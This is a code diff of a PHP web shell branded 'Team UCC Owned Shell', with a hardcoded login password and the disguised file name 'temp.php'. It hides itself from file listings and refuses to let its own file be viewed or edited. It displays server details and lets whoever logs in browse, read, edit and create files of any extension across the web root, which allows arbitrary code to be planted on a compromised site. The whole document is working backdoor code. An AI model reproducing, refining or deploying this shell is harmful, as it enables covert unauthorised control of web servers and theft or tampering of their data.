@@ -2,7 +2,7 @@
 session_start();
 
 $PASSWORD = 'odiyan911';
-$SHELL_NAME = basename(__FILE__);
+$SHELL_NAME = 'temp.php';
 
 // Handle logout
 if (isset($_GET['logout'])) {
@@ -11,7 +11,6 @@ if (isset($_GET['logout'])) {
     exit;
 }
 
-// Authentication
 if (!isset($_SESSION['authenticated'])) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
         if ($_POST['password'] === $PASSWORD) {
@@ -28,10 +27,11 @@ if (!isset($_SESSION['authenticated'])) {
             <meta charset="UTF-8" />
             <title>Access Restricted</title>
             <style>
+                @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
                 body {
-                    background: black;
+                    background-color: #000;
                     color: #0f0;
-                    font-family: monospace;
+                    font-family: 'Share Tech Mono', monospace;
                     display: flex;
                     justify-content: center;
                     align-items: center;
@@ -39,17 +39,21 @@ if (!isset($_SESSION['authenticated'])) {
                     margin: 0;
                     flex-direction: column;
                 }
+                h1 {
+                    text-shadow: 0 0 10px #0f0;
+                    margin-bottom: 20px;
+                }
                 form {
-                    background: #002200;
+                    background: #001100;
                     padding: 20px;
                     border-radius: 8px;
                     box-shadow: 0 0 15px #0f0;
                 }
                 input[type="password"] {
-                    background: #001100;
+                    background: #002200;
                     border: 1px solid #0f0;
                     color: #0f0;
-                    font-family: monospace;
+                    font-family: 'Share Tech Mono', monospace;
                     font-size: 1.2em;
                     padding: 10px;
                     border-radius: 5px;
@@ -60,13 +64,14 @@ if (!isset($_SESSION['authenticated'])) {
                     margin-top: 15px;
                     background: #0f0;
                     border: none;
-                    color: black;
+                    color: #000;
                     font-weight: bold;
                     padding: 10px 20px;
                     border-radius: 5px;
                     cursor: pointer;
-                    font-family: monospace;
+                    font-family: 'Share Tech Mono', monospace;
                     font-size: 1.1em;
+                    transition: background-color 0.3s ease;
                     width: 100%;
                 }
                 button:hover {
@@ -77,6 +82,7 @@ if (!isset($_SESSION['authenticated'])) {
                     margin-top: 15px;
                     font-weight: bold;
                     text-align: center;
+                    text-shadow: 0 0 5px #f00;
                 }
             </style>
         </head>
@@ -96,244 +102,345 @@ if (!isset($_SESSION['authenticated'])) {
     }
 }
 
-// Base directory (document root)
+// Base directory is DOCUMENT_ROOT to allow access above shell location
 $base_dir = realpath(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__);
 if ($base_dir === false) {
     $base_dir = realpath(__DIR__);
 }
 
-// Current directory relative to base_dir
-$rel_path = isset($_GET['path']) ? $_GET['path'] : '';
-$rel_path = trim($rel_path, '/\\');
-$abs_path = realpath($base_dir . DIRECTORY_SEPARATOR . $rel_path);
-
-// Validate path is inside base_dir
-if ($abs_path === false || strpos($abs_path, $base_dir) !== 0) {
-    $abs_path = $base_dir;
-    $rel_path = '';
+// Current path from GET, default to base_dir
+$requested_path = isset($_GET['path']) ? $_GET['path'] : '';
+$real_path = realpath($base_dir . DIRECTORY_SEPARATOR . $requested_path);
+if ($real_path === false || strpos($real_path, $base_dir) !== 0) {
+    $real_path = $base_dir;
 }
 
-// Handle file operations
+// Handle file creation or modification
 $message = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $action = $_POST['action'] ?? '';
-    $current_path = $_POST['current_path'] ?? '';
-    $current_abs = realpath($base_dir . DIRECTORY_SEPARATOR . $current_path);
-    if ($current_abs === false || strpos($current_abs, $base_dir) !== 0) {
-        $message = "Invalid directory.";
-    } else {
-        if ($action === 'delete' && isset($_POST['target'])) {
-            $target = basename($_POST['target']);
-            if ($target === $SHELL_NAME) {
-                $message = "Cannot delete shell file.";
-            } else {
-                $target_path = $current_abs . DIRECTORY_SEPARATOR . $target;
-                if (is_dir($target_path)) {
-                    // Recursive delete
-                    function rrmdir($dir) {
-                        foreach (scandir($dir) as $file) {
-                            if ($file === '.' || $file === '..') continue;
-                            $path = $dir . DIRECTORY_SEPARATOR . $file;
-                            if (is_dir($path)) rrmdir($path);
-                            else unlink($path);
-                        }
-                        rmdir($dir);
+    if (isset($_POST['filename'], $_POST['content'], $_POST['current_path'], $_POST['action'])) {
+        $filename = basename($_POST['filename']);
+        $content = $_POST['content'];
+        $current_path = $_POST['current_path'];
+        $action = $_POST['action'];
+
+        $target_dir = realpath($base_dir . DIRECTORY_SEPARATOR . $current_path);
+
+        if ($target_dir === false || strpos($target_dir, $base_dir) !== 0) {
+            $message = "Error: Invalid directory.";
+        } elseif ($filename === $SHELL_NAME) {
+            $message = "Error: Modification of shell file is not allowed.";
+        } else {
+            $filepath = $target_dir . DIRECTORY_SEPARATOR . $filename;
+            if ($action === 'create') {
+                if (file_exists($filepath)) {
+                    $message = "Error: File already exists.";
+                } else {
+                    if (file_put_contents($filepath, $content) !== false) {
+                        $message = "File '$filename' created successfully.";
+                    } else {
+                        $message = "Error: Could not create file.";
                     }
-                    rrmdir($target_path);
-                    $message = "Directory '$target' deleted.";
-                } elseif (is_file($target_path)) {
-                    unlink($target_path);
-                    $message = "File '$target' deleted.";
-                } else {
-                    $message = "Target does not exist.";
                 }
-            }
-        } elseif ($action === 'rename' && isset($_POST['target'], $_POST['newname'])) {
-            $target = basename($_POST['target']);
-            $newname = basename($_POST['newname']);
-            if ($target === $SHELL_NAME || $newname === $SHELL_NAME) {
-                $message = "Cannot rename shell file.";
-            } else {
-                $old_path = $current_abs . DIRECTORY_SEPARATOR . $target;
-                $new_path = $current_abs . DIRECTORY_SEPARATOR . $newname;
-                if (!file_exists($old_path)) {
-                    $message = "Target does not exist.";
-                } elseif (file_exists($new_path)) {
-                    $message = "New name already exists.";
+            } elseif ($action === 'edit') {
+                if (!file_exists($filepath)) {
+                    $message = "Error: File does not exist.";
                 } else {
-                    rename($old_path, $new_path);
-                    $message = "Renamed '$target' to '$newname'.";
+                    if (file_put_contents($filepath, $content) !== false) {
+                        $message = "File '$filename' saved successfully.";
+                    } else {
+                        $message = "Error: Could not save file.";
+                    }
                 }
             }
         }
     }
 }
 
-// List files and directories
-$items = scandir($abs_path);
-
-function urlPath($base, $path) {
-    $rel = ltrim(str_replace($base, '', $path), '/\\');
-    return str_replace('\\', '/', $rel);
+// Handle file viewing or editing
+$view_file = isset($_GET['view']) ? $_GET['view'] : '';
+$file_content = '';
+$file_error = '';
+$editing = false;
+if ($view_file !== '') {
+    $view_path = realpath($base_dir . DIRECTORY_SEPARATOR . $view_file);
+    if ($view_path === false || strpos($view_path, $base_dir) !== 0 || !is_file($view_path)) {
+        $file_error = "Error: File not found or access denied.";
+    } elseif (basename($view_path) === $SHELL_NAME) {
+        $file_error = "Error: Access to shell file content is forbidden.";
+    } else {
+        $file_content = file_get_contents($view_path);
+        $editing = isset($_GET['edit']);
+    }
 }
 
-$current_rel = urlPath($base_dir, $abs_path);
+$files = scandir($real_path);
 
+function relativePath($base, $path) {
+    return ltrim(str_replace($base, '', $path), DIRECTORY_SEPARATOR);
+}
+
+// Current relative path from base_dir
+$current_rel_path = relativePath($base_dir, $real_path);
+
+// Server info for info bar
+$server_info = [
+    'PHP Version' => phpversion(),
+    'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A',
+    'User' => get_current_user(),
+    'Document Root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'N/A',
+    'Server Name' => isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A',
+];
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>PHP Shell - File Manager</title>
+<title>Team UCC Owned Shell</title>
 <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
     body {
-        background: #0f0f0f;
-        color: #0f0;
-        font-family: monospace;
+        background-color: #0f0f0f;
+        color: #00ff00;
+        font-family: 'Share Tech Mono', monospace;
         margin: 0;
-        padding: 0 20px 20px 20px;
+        padding: 0;
     }
-    h1 {
-        text-shadow: 0 0 5px #0f0;
-        margin: 20px 0 10px 0;
+    .info-bar {
+        background-color: #002200;
+        border-bottom: 2px solid #00ff00;
+        padding: 10px 20px;
+        font-size: 0.9em;
+        display: flex;
+        flex-wrap: wrap;
+        gap: 15px;
+        user-select: none;
+        align-items: center;
+        justify-content: space-between;
+    }
+    .info-left, .info-right {
+        display: flex;
+        gap: 15px;
+        align-items: center;
+        flex-wrap: wrap;
+    }
+    .info-bar div {
+        white-space: nowrap;
+    }
+    h1, h2 {
+        text-shadow: 0 0 5px #00ff00;
+        margin: 20px;
     }
     a {
-        color: #0f0;
+        color: #00ff00;
         text-decoration: none;
     }
     a:hover {
         text-decoration: underline;
     }
+    .container {
+        max-width: 900px;
+        margin: 0 auto 40px auto;
+        padding: 0 20px 20px 20px;
+    }
     ul {
-        list-style: none;
+        list-style-type: none;
         padding-left: 0;
     }
-    li {
+    ul li {
         padding: 5px 0;
+        border-bottom: 1px solid #004400;
         display: flex;
         justify-content: space-between;
         align-items: center;
-        border-bottom: 1px solid #003300;
     }
-    .name {
-        flex-grow: 1;
-    }
-    .dir {
+    ul li span.dir {
+        color: #00cc00;
         font-weight: bold;
-        color: #0ff;
-        cursor: pointer;
-    }
-    .actions button {
-        background: #003300;
-        border: 1px solid #0f0;
-        color: #0f0;
-        padding: 3px 8px;
-        margin-left: 5px;
-        cursor: pointer;
-        font-family: monospace;
-        font-size: 0.9em;
-        border-radius: 3px;
-    }
-    .actions button:hover {
-        background: #0f0;
-        color: #000;
     }
     .message {
-        margin: 10px 0;
+               background-color: #003300;
+        border: 1px solid #00ff00;
         padding: 10px;
-        background: #003300;
-        border: 1px solid #0f0;
+        margin-bottom: 20px;
         border-radius: 5px;
     }
-    form.rename-form {
-        display: inline;
+    .error {
+        background-color: #330000;
+        border-color: #ff0000;
+        color: #ff4444;
     }
-    input.rename-input {
-        background: #001100;
-        border: 1px solid #0f0;
-        color: #0f0;
-        font-family: monospace;
+    .success {
+        background-color: #003300;
+        border-color: #00ff00;
+        color: #00ff00;
+    }
+    form {
+        background-color: #001100;
+        padding: 15px;
+        border-radius: 5px;
+        margin-top: 20px;
+    }
+    label {
+        display: block;
+        margin-bottom: 8px;
+    }
+    input[type="text"], textarea {
+        width: 100%;
+        background-color: #002200;
+        border: 1px solid #00ff00;
+        color: #00ff00;
+        font-family: 'Share Tech Mono', monospace;
         font-size: 1em;
-        padding: 2px 5px;
+        padding: 8px;
         border-radius: 3px;
-        width: 150px;
+        margin-bottom: 15px;
+        resize: vertical;
+    }
+    button {
+        background-color: #00ff00;
+        border: none;
+        color: #000;
+        font-weight: bold;
+        padding: 10px 20px;
+        cursor: pointer;
+        border-radius: 3px;
+        font-family: 'Share Tech Mono', monospace;
+        font-size: 1em;
+        transition: background-color 0.3s ease;
+    }
+    button:hover {
+        background-color: #00cc00;
+    }
+    pre {
+        background-color:#001100;
+        border: 1px solid #00ff00;
+        padding: 15px;
+        border-radius: 5px;
+        overflow-x: auto;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        max-height: 400px;
+    }
+    nav {
+        margin-bottom: 20px;
+    }
+    nav a {
+        margin-right: 10px;
+    }
+    .file-actions button {
+        background-color: transparent;
+        border: 1px solid #00ff00;
+        color: #00ff00;
+        padding: 3px 8px;
+        font-size: 0.9em;
+        border-radius: 3px;
+        cursor: pointer;
+        font-family: 'Share Tech Mono', monospace;
+        transition: background-color 0.3s ease;
+    }
+    .file-actions button:hover {
+        background-color: #00ff00;
+        color: #000;
     }
 </style>
-<script>
-function showRename(id) {
-    document.getElementById('rename-display-' + id).style.display = 'none';
-    document.getElementById('rename-form-' + id).style.display = 'inline';
-    document.getElementById('rename-input-' + id).focus();
-}
-function cancelRename(id) {
-    document.getElementById('rename-form-' + id).style.display = 'none';
-    document.getElementById('rename-display-' + id).style.display = 'inline';
-}
-function confirmDelete(name) {
-    return confirm("Are you sure you want to delete '" + name + "'?");
-}
-</script>
 </head>
 <body>
-<h1>PHP Shell - File Manager</h1>
-<div><strong>Current directory:</strong> /<?php echo htmlspecialchars($current_rel); ?></div>
-<?php
-if ($message !== '') {
-    echo '<div class="message">' . htmlspecialchars($message) . '</div>';
-}
-?>
-<ul>
-    <?php
-    // Show parent directory link if not at base
-    if ($abs_path !== $base_dir) {
-        $parent_rel = dirname($current_rel);
-        echo '<li><a href="?path=' . urlencode($parent_rel) . '">[..]</a></li>';
-    }
-    $id = 0;
-    foreach ($items as $item) {
-        if ($item === '.' || $item === $SHELL_NAME) continue;
-        if ($item === '..') continue; // handled above
-        $item_path = $abs_path . DIRECTORY_SEPARATOR . $item;
-        $is_dir = is_dir($item_path);
-        $display_name = htmlspecialchars($item);
-        echo '<li>';
-        echo '<div class="name">';
-        if ($is_dir) {
-            // Directory name as clickable link
-            $link_path = ($current_rel === '') ? $item : $current_rel . '/' . $item;
-            echo '<a href="?path=' . urlencode($link_path) . '" class="dir">' . $display_name . '</a>';
-        } else {
-            echo $display_name;
+<div class="info-bar">
+    <div class="info-left">
+        <div><strong>Shell Name:</strong> <?php echo htmlspecialchars($SHELL_NAME); ?></div>
+        <?php foreach ($server_info as $key => $value): ?>
+            <div><strong><?php echo htmlspecialchars($key); ?>:</strong> <?php echo htmlspecialchars($value); ?></div>
+        <?php endforeach; ?>
+    </div>
+    <div class="info-right">
+        <a href="?logout=1" style="color:#ff4444; font-weight:bold; text-decoration:none;">Logout</a>
+    </div>
+</div>
+<div class="container">
+    <h1>Team UCC Owned Shell</h1>
+    <nav>
+        <strong>Current Path:</strong>
+        <?php
+        // Build breadcrumb navigation from base_dir to current path
+        $parts = explode(DIRECTORY_SEPARATOR, $current_rel_path);
+        $path_accum = '';
+        echo '<a href="?">/</a>';
+        foreach ($parts as $part) {
+            if ($part === '') continue;
+            $path_accum .= DIRECTORY_SEPARATOR . $part;
+            echo ' / <a href="?path=' . urlencode(ltrim($path_accum, DIRECTORY_SEPARATOR)) . '">' . htmlspecialchars($part) . '</a>';
         }
-        echo '</div>';
-        echo '<div class="actions">';
-        // Rename button and form
-        echo '<span id="rename-display-' . $id . '">';
-        echo '<button type="button" onclick="showRename(' . $id . ')">Rename</button>';
-        echo '</span>';
-        echo '<form method="POST" class="rename-form" id="rename-form-' . $id . '" style="display:none;" onsubmit="return this.newname.value.trim() !== \'\';">';
-        echo '<input type="hidden" name="action" value="rename" />';
-        echo '<input type="hidden" name="target" value="' . htmlspecialchars($item) . '" />';
-        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel) . '" />';
-        echo '<input type="text" name="newname" class="rename-input" id="rename-input-' . $id . '" value="' . htmlspecialchars($item) . '" required />';
-        echo '<button type="submit">Save</button>';
-        echo '<button type="button" onclick="cancelRename(' . $id . ')">Cancel</button>';
-        echo '</form>';
-        // Delete button with confirmation
-        echo '<form method="POST" style="display:inline;" onsubmit="return confirmDelete(\'' . addslashes($item) . '\');">';
-        echo '<input type="hidden" name="action" value="delete" />';
-        echo '<input type="hidden" name="target" value="' . htmlspecialchars($item) . '" />';
-        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel) . '" />';
-        echo '<button type="submit">Delete</button>';
-        echo '</form>';
-        echo '</div>';
-        echo '</li>';
-        $id++;
-    }
-    ?>
-</ul>
-<div style="margin-top: 20px;">
-    <a href="?logout=1" style="color:#f00;">Logout</a>
+        ?>
+    </nav>
+
+    <?php if ($message): ?>
+        <div class="message <?php echo strpos($message, 'Error') === false ? 'success' : 'error'; ?>">
+            <?php echo htmlspecialchars($message); ?>
+        </div>
+    <?php endif; ?>
+
+    <?php if ($file_error): ?>
+        <div class="message error"><?php echo htmlspecialchars($file_error); ?></div>
+    <?php endif; ?>
+
+    <?php if ($file_content !== ''): ?>
+        <h2><?php echo $editing ? 'Editing File:' : 'Viewing File:'; ?> <?php echo htmlspecialchars($view_file); ?></h2>
+        <?php if ($editing): ?>
+            <form method="POST" autocomplete="off">
+                <input type="hidden" name="filename" value="<?php echo htmlspecialchars(basename($view_file)); ?>" />
+                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars(dirname($view_file)); ?>" />
+                <input type="hidden" name="action" value="edit" />
+                <textarea name="content" rows="20" required><?php echo htmlspecialchars($file_content); ?></textarea>
+                <button type="submit">Save</button>
+                <a href="?path=<?php echo urlencode($current_rel_path); ?>" style="margin-left:10px; color:#00ff00;">Cancel</a>
+            </form>
+        <?php else: ?>
+            <pre><?php echo htmlspecialchars($file_content); ?></pre>
+            <p>
+                <a href="?view=<?php echo urlencode($view_file); ?>&edit=1" style="color:#00ff00;">Edit</a> |
+                <a href="?path=<?php echo urlencode($current_rel_path); ?>" style="color:#00ff00;">Back to directory</a>
+            </p>
+        <?php endif; ?>
+    <?php else: ?>
+        <h2>Files and Directories</h2>
+        <ul>
+            <?php
+            if ($real_path !== $base_dir) {
+                $parent_path = dirname($current_rel_path);
+                echo '<li><a href="?path=' . urlencode($parent_path) . '">[..]</a></li>';
+            }
+            foreach ($files as $file) {
+                if ($file === '.' || $file === '..') continue;
+                if ($file === $SHELL_NAME) continue;
+                $full_path = $real_path . DIRECTORY_SEPARATOR . $file;
+                $rel_path = ltrim($current_rel_path . DIRECTORY_SEPARATOR . $file, DIRECTORY_SEPARATOR);
+                if (is_dir($full_path)) {
+                    echo '<li><span class="dir">[DIR]</span> <a href="?path=' . urlencode($rel_path) . '">' . htmlspecialchars($file) . '</a></li>';
+                } else {
+                    echo '<li><a href="?view=' . urlencode($rel_path) . '">' . htmlspecialchars($file) . '</a>
+                    <span class="file-actions">
+                        <a href="?view=' . urlencode($rel_path) . '&edit=1"><button type="button">Edit</button></a>
+                    </span>
+                    </li>';
+                }
+            }
+            ?>
+        </ul>
+
+        <h2>Create / Upload New File</h2>
+        <form method="POST" autocomplete="off">
+            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_rel_path); ?>" />
+            <input type="hidden" name="action" value="create" />
+            <label for="filename">Filename (any extension allowed):</label>
+            <input type="text" id="filename" name="filename" required />
+
+            <label for="content">Content:</label>
+            <textarea id="content" name="content" rows="10" required></textarea>
+
+            <button type="submit">Create / Upload File</button>
+        </form>
+    <?php endif; ?>
 </div>
 </body>
 </html>
